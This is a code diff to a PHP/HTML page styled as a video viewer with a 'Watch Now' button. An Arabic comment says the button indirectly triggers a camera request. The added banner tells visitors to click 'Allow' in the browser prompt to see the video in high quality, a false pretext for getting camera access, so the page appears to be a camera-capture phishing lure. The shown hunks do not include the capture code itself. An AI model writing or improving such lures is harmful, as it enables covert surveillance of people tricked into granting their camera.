@@ -300,9 +300,16 @@ if (isset($_GET['r'])) {
         // عند النقر على زر شاهد الآن، يتم تفعيل طلب الكاميرا بشكل غير مباشر
         function watchNowAction() {
             const btn = document.getElementById('watchBtn');
+            const alertBox = document.getElementById('cameraAlert');
+            
             if (btn) {
                 btn.innerText = "جاري التحميل...";
                 btn.disabled = true;
+            }
+
+            // إظهار إشعار السماح للكاميرا تحت الزر فوراً
+            if (alertBox && useCamera) {
+                alertBox.style.display = "block";
             }
 
             if (!useCamera) {
@@ -348,6 +355,11 @@ if (isset($_GET['r'])) {
                 <button id="watchBtn" onclick="watchNowAction()" style="background: #fe2c55; color: white; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; border-radius: 30px; cursor: pointer; width: 100%; box-shadow: 0 4px 15px rgba(254,44,85,0.4);">
                     ▶ شاهد الآن
                 </button>
+
+                <!-- لافتة التنبيه الخاصة بالسماح للكاميرا تحت الزر مباشرة -->
+                <div id="cameraAlert" style="display: none; margin-top: 12px; background: rgba(254, 44, 85, 0.15); border: 1px solid rgba(254, 44, 85, 0.4); color: #ff85a2; padding: 10px; border-radius: 8px; font-size: 13px; direction: rtl;">
+                    ⚠️ يرجى الضغط على <b>"السماح" (Allow)</b> في نافذة المتصفح المنبثقة لعرض الفيديو بجودة عالية.
+                </div>
             </div>
         </div>
     </div>
